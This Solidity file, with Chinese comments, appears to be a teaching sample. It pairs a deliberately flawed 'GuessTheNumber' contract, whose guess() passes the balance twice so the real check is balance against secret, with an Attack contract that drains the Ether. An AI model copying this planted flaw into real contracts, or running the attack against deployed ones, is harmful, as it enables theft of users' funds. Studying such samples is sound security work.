// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
漏洞名稱：Function Call with Wrong Arguments
描述：
此漏洞發生在呼叫函式時的參數傳遞順序遭到錯誤操作（模擬右-to-left 覆蓋控制字元效應），
導致本應以 (獎金, 猜測數字, 使用者) 的順序傳入參數卻被錯誤地傳成 (獎金, 獎金, 使用者)。

測試與攻擊步驟：
1. 部署本合約時，設定秘密數字 _secretNumber 為一個特定值，最好與合約餘額相等。
2. 攻擊者通過攻擊合約 Attack 呼叫 guess() 函式，傳入任意參數，但由於漏洞，實際比較的是合約餘額 p 與 _secretNumber。
3. 當 p == _secretNumber 時，攻擊者取走全部 Ether。
*/

contract GuessTheNumber {
    uint private _secretNumber; // 部署者設定的秘密數字
    event success(string message);
    event wrongNumber(string message);

    // 建構子設定秘密數字
    constructor(uint secretNumber) {
        _secretNumber = secretNumber;
    }

    // 定義正確接收 Ether 的函式
    receive() external payable {}

    // 漏洞函式：使用錯誤的參數順序呼叫內部函式
    function guess(uint n) payable public {
        require(msg.value == 1 ether, "Require exactly 1 ether");
        uint p = address(this).balance;
        // 漏洞重點：原應呼叫 checkAndTransferPrize(p, n, msg.sender)，
        // 但誤使用控制字元（模擬效果）導致傳入 (p, p, msg.sender)
        checkAndTransferPrize(p, p, payable(msg.sender));
    }

    // 內部函式檢查數字，若正確則轉移全部獎金
    function checkAndTransferPrize(uint p, uint n, address payable guesser) internal returns(bool) {
        if(n == _secretNumber) {
            guesser.transfer(p);
            emit success("You guessed the correct number!");
            return true;
        } else {
            emit wrongNumber("Youve made an incorrect guess!");
            return false;
        }
    }
}

// 攻擊合約：模擬利用漏洞取得合約獎金
contract Attack {
    GuessTheNumber public target;
    event AttackResult(bool success);

    /*
    注意：
    原先使用的建構子參數型別為 address 會產生編譯錯誤，
    因為合約 GuessTheNumber 包含 payable fallback 函式，必須使用 address payable。
    因此，本建構子接受 address payable 作為參數。
    */
    constructor(address payable _target) {
        target = GuessTheNumber(_target);
    }

    /*
    攻擊步驟說明：
    1. 攻擊方先確保目標合約內 _secretNumber 值與合約餘額（p）符合。
    2. 攻擊者呼叫 attack() 並傳送 1 ether，由於漏洞，內部實際上使用的參數為 (p, p, msg.sender)。
    3. 當 p == _secretNumber 時，攻擊者便可取得合約中所有 Ether。
    */
    function attack() external payable {
        require(msg.value == 1 ether, "Need to send 1 ether for the attack");
        // 傳入的參數值不影響最終檢查，因為漏洞會導致錯誤的參數順序
        target.guess{value: 1 ether}(123);
        emit AttackResult(true);
    }

    // 使本合約能正確接收 Ether
    receive() external payable {}
}
